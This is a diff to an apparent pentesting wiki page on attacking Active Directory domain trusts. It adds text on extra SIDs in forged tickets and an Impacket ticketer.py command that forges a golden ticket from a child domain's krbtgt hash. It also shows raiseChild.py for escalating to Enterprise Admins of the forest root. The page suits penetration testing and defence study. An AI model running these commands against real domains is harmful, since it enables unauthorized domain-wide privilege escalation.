@@ -282,7 +282,7 @@ Get-DomainForeignGroupMember
 
 ### Forging Tickets
 
-Kerberos authentication across domains depends on the _trust key_.
+When forging a[ referral ticket](domain-trusts.md#referral-ticket), or a [golden ticket](domain-trusts.md#golden-ticket), additional security identifiers (SIDs) can be added as "extra SID" and be considered as part of the user's [SID history](domain-trusts.md#sid-history) when authenticating.
 
 {% tabs %}
 {% tab title="UNIX-like" %}
@@ -310,6 +310,13 @@ KRB5CCNAME="someusername.ccache" getST.py -k -no-pass -debug -spn "CIFS/domain_c
 ticketer.py -nthash "child_domain_krbtgt_NT_hash" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "-" "someusername"
 ```
 
+#### **Golden ticket**
+
+```bash
+# 1. forge the ticket
+ticketer.py -nthash "child_domain_krbtgt_NT_hash" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "<root_domain_SID>-<RID>" "someusername"
+```
+
 Impacket's [raiseChild.py](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py) script can also be used to conduct the golden ticket technique automatically when SID filtering is disabled (retrieving the SIDs, dumping the trusted domain's krbtgt, forging the ticket, dumping the forest root keys, etc.). It will forge a ticket with the Enterprise Admins extra SID.
 
 ```bash
@@ -327,6 +334,8 @@ raiseChild.py "child_domain"/"child_domain_admin":"$PASSWORD"
 {% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)?redirectedfrom=MSDN" %}
 
 {% embed url="https://www.thehacker.recipes/ad/movement/trusts" %}
+
+{% embed url="https://mayfly277.github.io/posts/GOADv2-pwning-part12/" %}
 
 {% embed url="https://medium.com/r3d-buck3t/breaking-domain-trusts-with-forged-trust-tickets-5f03fb71cd72" %}
 
